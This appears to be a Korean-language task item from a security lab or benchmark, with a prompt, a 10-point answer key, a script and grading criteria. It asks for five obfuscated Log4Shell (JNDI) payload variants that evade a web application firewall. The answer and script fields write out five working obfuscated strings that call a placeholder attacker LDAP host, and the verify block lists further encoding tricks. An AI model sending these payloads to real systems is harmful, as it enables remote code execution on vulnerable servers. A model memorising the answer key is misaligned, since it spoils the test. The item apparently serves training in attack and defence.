  category: attack
  points: 10
  answer: '🤖 프롬프트: 변형 페이로드 5종

    📎 참고 (CLI): cat > /tmp/w06-variants.txt <<''T''

    ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}

    ${${lower:j}ndi:ldap://attacker/a}

    ${${env:BARFOO:-j}ndi:ldap://attacker/a}

    ${jndi:${lower:l}${lower:d}${lower:a}p://attacker/a}

    ${jndi:ldap://${::-attacker}/a}

    T

    cat /tmp/w06-variants.txt'
  answer_detail: '[공격] 변형으로 WAF 우회.'
  verify:
    type: output_contains
    expect: jndi
    field: stdout
    semantic:
      intent: 변형 페이로드 5종 — (1) ${lower:j}ndi (2) ${${env:x:-j}}ndi (3) ${${:-j}${:-n}${:-d}${:-i}}
        (4) URL encode %24%7Bjndi (5) Nested ${${::-j}ndi}. WAF bypass
      success_criteria:
      - 5 변형 페이로드
      - nested + encoding 조합
      acceptable_methods:
      - cat > file + 변형 목록
      negative_signs:
      - 변형 3 이하
  target_vm: web
  script: 'cat > /tmp/w06-variants.txt <<''T''

    ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}

    ${${lower:j}ndi:ldap://attacker/a}

    ${${env:BARFOO:-j}ndi:ldap://attacker/a}

    ${jndi:${lower:l}${lower:d}${lower:a}p://attacker/a}

    ${jndi:ldap://${::-attacker}/a}

    T

    cat /tmp/w06-variants.txt'
  risk_level: low
  bastion_prompt: '변형 페이로드 5종


